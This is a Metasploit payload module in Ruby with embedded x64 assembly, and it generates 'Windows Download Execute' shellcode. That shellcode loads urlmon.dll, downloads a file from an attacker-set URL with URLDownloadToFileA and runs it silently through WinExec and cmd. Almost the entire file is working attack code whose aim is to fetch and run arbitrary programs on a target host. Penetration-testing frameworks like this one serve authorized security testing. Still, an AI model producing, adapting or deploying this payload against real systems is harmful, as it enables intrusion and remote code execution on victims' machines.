# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 353

  include Msf::Payload::Single
  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi_x64

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Download Execute',
        'Description' => 'Downloads and executes the file from the specified url.',
        'Author' => 'Muzaffer Umut ŞAHİN <mailatmayinlutfen@gmail.com>',
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X64
      )
    )

    display_options = %w[HIDE SHOW]

    register_options(
      [
        OptString.new('URL', [true, 'The url to download the file from.', 'http://localhost/hi.exe']),
        OptString.new('FILEPATH', [true, 'The path to save the downloaded file.', 'fox.exe']),
        OptEnum.new('DISPLAY', [true, 'The Display type.', display_options[0], display_options])
      ]
    )
  end

  def generate(_opts = {})
    url = datastore['URL'] || 'http://localhost/hi.exe'
    file = datastore['FILEPATH'] || 'fox.exe'
    display = datastore['DISPLAY'] || 'HIDE'

    payload = %^
            cld
            and rsp, -16
            call main
            #{asm_block_api}

        main:
            pop rbp
            call LoadLibrary
            db "urlmon.dllK"

        LoadLibrary:
            pop rcx ; rcx points to the dll name.
            xor byte [rcx+10], 'K' ; null terminator
            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
            call rbp ; LoadLibraryA("urlmon.dll")
            ; To live alone one must be an animal or a god, says Aristotle. There is yet a third case: one must be both--a philosopher.

        SetUrl:
            call SetFile
            db "#{url}A"

        SetFile:
            pop rdx ; 2nd argument
            xor byte [rdx+#{url.length}], 'A' ; null terminator
            call UrlDownloadToFile
            db "#{file}C"

        UrlDownloadToFile:
            pop r8 ; 3rd argument
            xor byte [r8+#{file.length}], 'C' ; null terminator
            xor rcx,rcx ; 1st argument
            xor r9,r9   ; 4th argument
            sub rsp, 8
            push rcx    ; 5th argument
            mov r10d, #{Rex::Text.block_api_hash('urlmon.dll', 'URLDownloadToFileA')}
            call rbp

        SetCommand:
            call Exec
            db "cmd /c #{file}F"

        Exec:
            pop rcx ; 1st argument
            xor byte [rcx+#{file.length + 7}], 'F' ; null terminator
            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'WinExec')}
            xor rdx, rdx ; 2nd argument
        ^

    if display == 'HIDE'
      hide = %(
            call rbp
            )
      payload << hide

    elsif display == 'SHOW'
      show = %(
            inc rdx ; SW_NORMAL = 1
            call rbp
            )
      payload << show
    end

    if datastore['EXITFUNC'] == 'process'
      exit_asm = %(
            xor rcx,rcx
            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
            call rbp
            )
      payload << exit_asm

    elsif datastore['EXITFUNC'] == 'thread'
      exit_asm = %(
            xor rcx,rcx
            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitThread')}
            call rbp
            )
      payload << exit_asm
    end

    Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string
  end
end
